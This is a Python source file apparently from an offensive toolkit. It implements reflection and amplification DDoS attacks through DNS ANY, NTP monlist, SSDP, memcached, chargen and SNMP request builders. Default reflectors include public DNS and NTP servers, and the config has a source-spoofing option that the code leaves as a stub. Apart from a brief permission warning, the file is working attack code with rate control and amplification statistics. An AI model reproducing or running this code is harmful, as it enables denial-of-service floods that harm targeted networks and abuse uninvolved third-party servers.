"""
Amplification Attack Module

Implements reflection/amplification attacks using various protocols.
These attacks use third-party servers to amplify traffic.

WARNING: Only use against systems you own or have permission to test.
Amplification attacks can cause significant collateral damage.
"""

import asyncio
import socket
import struct
import random
import time
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional, Tuple
from collections import deque
import logging

logger = logging.getLogger(__name__)


@dataclass
class AmplificationConfig:
    """Configuration for amplification attacks"""
    target: str
    target_port: int
    reflectors: List[str] = field(default_factory=list)
    duration: int = 60
    rate_limit: int = 1000  # Requests per second
    spoof_source: bool = True  # Requires raw sockets
    timeout: float = 2.0


@dataclass
class AmplificationStats:
    """Statistics for amplification attacks"""
    requests_sent: int = 0
    bytes_sent: int = 0
    estimated_amplification: float = 1.0
    estimated_reflected_bytes: int = 0
    errors: int = 0
    start_time: float = field(default_factory=time.time)
    
    def get_rate(self) -> float:
        elapsed = time.time() - self.start_time
        return self.requests_sent / elapsed if elapsed > 0 else 0


class AmplificationAttack(ABC):
    """Base class for amplification attacks"""
    
    # Amplification factor (response size / request size)
    AMPLIFICATION_FACTOR = 1.0
    DEFAULT_PORT = 0
    
    def __init__(self, config: AmplificationConfig):
        self.config = config
        self.stats = AmplificationStats()
        self._running = False
        self._sockets: List[socket.socket] = []
        
    @abstractmethod
    def build_request(self) -> bytes:
        """Build the amplification request packet"""
        pass
    
    @abstractmethod
    def get_default_reflectors(self) -> List[str]:
        """Get default list of reflector servers"""
        pass
    
    async def start(self):
        """Start the amplification attack"""
        self._running = True
        self.stats = AmplificationStats()
        
        reflectors = self.config.reflectors or self.get_default_reflectors()
        if not reflectors:
            logger.error("No reflectors available")
            return
            
        logger.info(f"Starting amplification attack with {len(reflectors)} reflectors")
        logger.info(f"Target: {self.config.target}:{self.config.target_port}")
        logger.info(f"Estimated amplification: {self.AMPLIFICATION_FACTOR}x")
        
        # Create tasks for each reflector
        tasks = []
        for reflector in reflectors:
            task = asyncio.create_task(self._attack_via_reflector(reflector))
            tasks.append(task)
            
        # Run until duration expires
        try:
            await asyncio.wait_for(
                asyncio.gather(*tasks, return_exceptions=True),
                timeout=self.config.duration
            )
        except asyncio.TimeoutError:
            pass
            
        self._running = False
        logger.info(f"Attack complete. Sent {self.stats.requests_sent} requests")
        
    async def stop(self):
        """Stop the attack"""
        self._running = False
        
    async def _attack_via_reflector(self, reflector: str):
        """Send requests via a single reflector"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        
        try:
            request = self.build_request()
            interval = 1.0 / (self.config.rate_limit / len(self.config.reflectors or [reflector]))
            
            while self._running:
                try:
                    # Send to reflector (response goes to spoofed target)
                    if self.config.spoof_source:
                        # Would need raw socket for IP spoofing
                        # For now, send normally (for testing)
                        pass
                    
                    sock.sendto(request, (reflector, self.DEFAULT_PORT))
                    
                    self.stats.requests_sent += 1
                    self.stats.bytes_sent += len(request)
                    self.stats.estimated_reflected_bytes += int(len(request) * self.AMPLIFICATION_FACTOR)
                    
                except Exception as e:
                    self.stats.errors += 1
                    
                await asyncio.sleep(interval)
                
        finally:
            sock.close()
            
    def get_stats(self) -> Dict[str, Any]:
        """Get attack statistics"""
        return {
            'requests_sent': self.stats.requests_sent,
            'bytes_sent': self.stats.bytes_sent,
            'estimated_reflected_bytes': self.stats.estimated_reflected_bytes,
            'amplification_factor': self.AMPLIFICATION_FACTOR,
            'rate': self.stats.get_rate(),
            'errors': self.stats.errors,
        }


class DNSAmplification(AmplificationAttack):
    """
    DNS Amplification Attack
    
    Uses DNS servers to amplify traffic. ANY queries can produce
    responses 28-54x larger than requests.
    """
    
    AMPLIFICATION_FACTOR = 28.0  # Conservative estimate
    DEFAULT_PORT = 53
    
    def __init__(self, config: AmplificationConfig, query_domain: str = "google.com"):
        super().__init__(config)
        self.query_domain = query_domain
        self.query_type = 255  # ANY
        
    def build_request(self) -> bytes:
        """Build DNS ANY query"""
        # Transaction ID
        transaction_id = random.randint(0, 65535)
        
        # Flags: Standard query, recursion desired
        flags = 0x0100
        
        # Questions: 1, Answers: 0, Authority: 0, Additional: 0
        header = struct.pack('>HHHHHH', 
            transaction_id, flags, 1, 0, 0, 0)
        
        # Build QNAME
        qname = b''
        for label in self.query_domain.split('.'):
            qname += bytes([len(label)]) + label.encode()
        qname += b'\x00'
        
        # QTYPE (ANY=255) and QCLASS (IN=1)
        question = qname + struct.pack('>HH', self.query_type, 1)
        
        return header + question
    
    def get_default_reflectors(self) -> List[str]:
        """Public DNS servers (for testing only)"""
        return [
            '8.8.8.8',      # Google
            '8.8.4.4',      # Google
            '1.1.1.1',      # Cloudflare
            '1.0.0.1',      # Cloudflare
            '9.9.9.9',      # Quad9
            '208.67.222.222',  # OpenDNS
            '208.67.220.220',  # OpenDNS
        ]


class NTPAmplification(AmplificationAttack):
    """
    NTP Amplification Attack
    
    Uses NTP servers with monlist command to amplify traffic.
    Can achieve 556x amplification.
    """
    
    AMPLIFICATION_FACTOR = 556.0
    DEFAULT_PORT = 123
    
    def build_request(self) -> bytes:
        """Build NTP monlist request"""
        # NTP mode 7 (private) with REQ_MON_GETLIST_1 command
        # This is the classic monlist amplification vector
        
        # Version 2, Mode 7 (private), Implementation specific
        header = bytes([
            0x17,  # LI=0, VN=2, Mode=7
            0x00,  # Implementation
            0x03,  # Request code (MON_GETLIST_1)
            0x2a,  # Sequence + status
        ])
        
        # Pad to 48 bytes (minimum NTP packet)
        padding = bytes(44)
        
        return header + padding
    
    def get_default_reflectors(self) -> List[str]:
        """NTP servers (most have monlist disabled now)"""
        return [
            'pool.ntp.org',
            'time.google.com',
            'time.windows.com',
            'time.apple.com',
        ]


class SSDPAmplification(AmplificationAttack):
    """
    SSDP Amplification Attack
    
    Uses UPnP devices to amplify traffic via SSDP M-SEARCH.
    Can achieve 30x amplification.
    """
    
    AMPLIFICATION_FACTOR = 30.0
    DEFAULT_PORT = 1900
    
    def build_request(self) -> bytes:
        """Build SSDP M-SEARCH request"""
        request = (
            "M-SEARCH * HTTP/1.1\r\n"
            "HOST: 239.255.255.250:1900\r\n"
            "MAN: \"ssdp:discover\"\r\n"
            "MX: 2\r\n"
            "ST: ssdp:all\r\n"
            "\r\n"
        )
        return request.encode()
    
    def get_default_reflectors(self) -> List[str]:
        """SSDP multicast address"""
        return ['239.255.255.250']


class MemcachedAmplification(AmplificationAttack):
    """
    Memcached Amplification Attack
    
    Uses exposed memcached servers to amplify traffic.
    Can achieve 51000x amplification (highest known).
    """
    
    AMPLIFICATION_FACTOR = 51000.0
    DEFAULT_PORT = 11211
    
    def build_request(self) -> bytes:
        """Build memcached stats request"""
        # Simple stats command that returns large response
        return b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
    
    def get_default_reflectors(self) -> List[str]:
        """No default reflectors - must be provided"""
        return []


class ChargenAmplification(AmplificationAttack):
    """
    Chargen Amplification Attack
    
    Uses chargen service (port 19) to amplify traffic.
    Sends continuous stream of characters.
    """
    
    AMPLIFICATION_FACTOR = 358.0
    DEFAULT_PORT = 19
    
    def build_request(self) -> bytes:
        """Build chargen request (any data triggers response)"""
        return b'\x00'
    
    def get_default_reflectors(self) -> List[str]:
        """No default reflectors - chargen is rarely enabled"""
        return []


class SNMPAmplification(AmplificationAttack):
    """
    SNMP Amplification Attack
    
    Uses SNMP servers with default community strings.
    Can achieve 6.3x amplification.
    """
    
    AMPLIFICATION_FACTOR = 6.3
    DEFAULT_PORT = 161
    
    def __init__(self, config: AmplificationConfig, community: str = "public"):
        super().__init__(config)
        self.community = community
        
    def build_request(self) -> bytes:
        """Build SNMP GetBulk request"""
        # Simplified SNMP v2c GetBulk request
        # This is a basic implementation
        
        community = self.community.encode()
        
        # SNMP header
        version = bytes([0x02, 0x01, 0x01])  # Version 2c
        community_field = bytes([0x04, len(community)]) + community
        
        # GetBulk PDU for system OID tree
        oid = bytes([0x06, 0x08, 0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00])
        
        # Build request
        request = version + community_field + oid
        
        # Wrap in sequence
        return bytes([0x30, len(request)]) + request
    
    def get_default_reflectors(self) -> List[str]:
        """No default reflectors"""
        return []
